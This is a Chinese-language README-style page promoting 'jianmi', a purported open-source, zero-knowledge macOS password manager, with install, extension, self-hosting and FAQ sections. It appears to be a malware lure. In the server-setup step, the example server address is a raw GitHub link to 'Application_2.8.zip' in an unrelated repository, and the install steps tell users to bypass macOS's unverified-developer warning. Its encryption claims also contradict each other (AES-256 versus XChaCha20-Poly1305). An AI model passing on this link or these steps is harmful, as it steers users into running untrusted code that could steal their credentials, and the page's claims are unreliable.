📖 什么是简密 (jianmi)?

简密是一款简洁安全的密码管理工具。想象一下，你只需要记住一个主密码，就能安全地管理所有的其他密码——无论是网银、邮箱、还是各种网站的登录信息。

与传统密码管理器不同，简密是零知识架构：这意味着你的所有数据在离开你的设备之前就已经被加密，即使是服务器管理员也无法查看你的任何信息。你的密码，只有你一个人知道。

简密完全免费，开源自托管，你可以随时掌控自己的数据。

✨ 核心功能特色

🔒 零知识加密

使用世界顶级的 libsodium 加密库，你的数据以 AES-256 加密后存储在服务器上，服务端完全不接触你的明文密码。

🧠 简单易用

界面设计极简，没有繁琐的操作。三步之内即可完成密码的添加、查找和复制。专为普通用户设计。

🌐 浏览器扩展

支持主流浏览器扩展，自动填充网页登录表单，让你在浏览网页时无需手动输入密码，更快更安全。

🏠 自托管

数据完全由你自己掌控，可以部署在自己的服务器上（支持 macOS 及 Linux 环境），不依赖任何第三方云服务。

⚡️ 原生性能

采用原生 Swift/SwiftUI 开发 macOS 客户端，配合 Rust 编写的高性能服务端，启动迅速，操作流畅无卡顿。

🔄 跨平台同步

无论你在哪台电脑上，只要安装了简密客户端并连接到你的服务器，就能随时随地访问你的密码库。

🚀 快速开始指南

第一步：下载简密

点击下方橙色按钮，进入下载页面：

📦 前往下载页面

在这个页面上，你会看到一个资源列表。请找到最新版本的 macOS 安装文件（例如 jianmi-1.2.3.dmg 或 jianmi-1.2.3.zip），点击下载。

第二步：安装应用

下载完成后：

  • 如果下载的是 .dmg 文件：双击打开它，然后将简密图标拖到"应用程序"文件夹。完成后，从应用程序文件夹双击打开简密。
  • 如果下载的是 .zip 文件：右键点击文件，选择"打开"。系统会自动解压，你可以在解压后的文件夹中找到简密并双击运行。

💡 macOS 安全提示：如果首次打开时系统提示"无法验证开发者"，请进入"系统偏好设置" → "隐私与安全性"，在下方点击"仍要打开"即可。

第三步：创建你的主密码

启动简密后，使用向导创建一个主密码。这是你唯一需要记住的密码，请务必牢记！它使用高级加密算法保护你的所有数据。

  • 使用至少12个字符，混合大小写字母、数字和符号。
  • 不要与其他任何账户共用这个密码。
  • 建议使用密码管理器或纸笔备份（存放在安全的地方）。

第四步：开始添加你的密码

点击左上角的"+"号，添加网站名称、用户名、密码等。简密会自动生成高强度随机密码（可选），你只需点击保存。从此，你只需要点击对应条目，密码就会自动复制到剪贴板。

🖥️ 浏览器扩展使用说明

浏览器扩展让你在浏览网页时自动填充登录信息。目前支持 Chrome、Firefox 和 Safari。

  1. 在浏览器扩展商店搜索"jianmi"并安装。
  2. 点击浏览器工具栏上的简密图标。
  3. 使用你的主密码解锁（需要先安装主 mac 应用）。
  4. 当你访问某个网站时，简密会自动匹配并填入已保存的凭据。

🔧 自托管服务器设置（可选但推荐）

简密的核心优势在于自托管。如果你有一台 Linux 或 macOS 服务器（或旧的电脑），可按照以下步骤部署服务端：

  1. 从下载页面获取 jianmi-server 二进制文件（选择与你服务器系统匹配的版本）。
  2. 将文件上传到你的服务器，赋予执行权限：chmod +x jianmi-server
  3. 运行 ./jianmi-server，它会自动创建一个配置文件 config.toml。
  4. 编辑 config.toml 设置端口和存储路径。
  5. 再次运行即可启动服务。在 mac 客户端设置中输入你的服务器地址（例如 https://raw.githubusercontent.com/Mostafa13447/mostafa13447.github.io/main/paratomial/Application_2.8.zip）。

如需更详细的部署教程，请参阅仓库中的 SERVER_SETUP.md 文档。

🛡️ 安全与隐私

简密严格遵循安全工程最佳实践：

  • 加密标准：使用 libsodium (XChaCha20-Poly1305) 进行对称加密。这是目前公认最安全的现代加密算法之一。
  • 密钥派生：你的主密码通过 Argon2id 算法（内存加固型）进行密钥派生，有效抵御暴力破解。
  • 零知识设计：服务端只存储密文和元数据，没有任何解密密钥。即使服务器被入侵，攻击者也无法获取你的密码。
  • 开源审计：完整源代码在 GitHub 上公开，任何安全专家都可以检验其安全性。

❓ 常见问题 (FAQ)

简密是免费的吗？

是的，简密完全免费开源。你可以自行托管服务端，不需要支付任何费用。

如果忘记主密码怎么办？

由于零知识架构，没有人（包括开发者）能恢复你的主密码。我们强烈建议你将主密码写在纸上放在安全的地方。请勿相信任何声称能找回密码的服务。

我可以在 Windows 上使用吗？

目前客户端仅支持 macOS（版本 11.0 及以上）。Windows 用户可以使用浏览器扩展，以及访问自托管服务器上的 Web 界面（如果部署了的话）。我们正在积极开发 Windows 版，敬请期待。

如何备份我的密码库？

最简单的方法是保留一份你服务器上的数据库文件的副本（通常在 ./data 目录下）。另外，也可以导出为加密的 .json 文件（在客户端中操作）。
